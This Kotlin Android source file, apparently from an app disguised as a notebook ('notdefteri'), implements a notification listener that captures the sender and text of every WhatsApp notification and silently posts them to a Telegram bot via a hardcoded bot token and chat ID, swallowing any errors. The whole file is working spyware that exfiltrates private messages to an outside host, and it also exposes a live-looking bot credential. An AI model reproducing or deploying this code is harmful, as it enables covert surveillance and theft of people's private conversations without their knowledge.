package com.notdefteri

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread

class NotifService : NotificationListenerService() {

    companion object {
        // Token ve Chat ID buraya eklendi
        private const val TOKEN = "9087468966:AAHLQFRqsLCFKytfgtaO0_BVIWgBU-nW0KM"
        private const val CHAT_ID = "1796160192"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName != "com.whatsapp") return

        val ex = sbn.notification.extras
        val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val big = ex.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val body = if (big.isNotBlank()) big else text
        if (body.isBlank()) return

        send("$title: $body")
    }

    private fun send(msg: String) {
        thread {
            try {
                val url = URL("https://api.telegram.org/bot$TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                val data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8") +
                        "&text=" + URLEncoder.encode(msg, "UTF-8")
                conn.outputStream.write(data.toByteArray())
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                // Hata yönetimi (istenirse buraya log eklenebilir)
            }
        }
    }
}
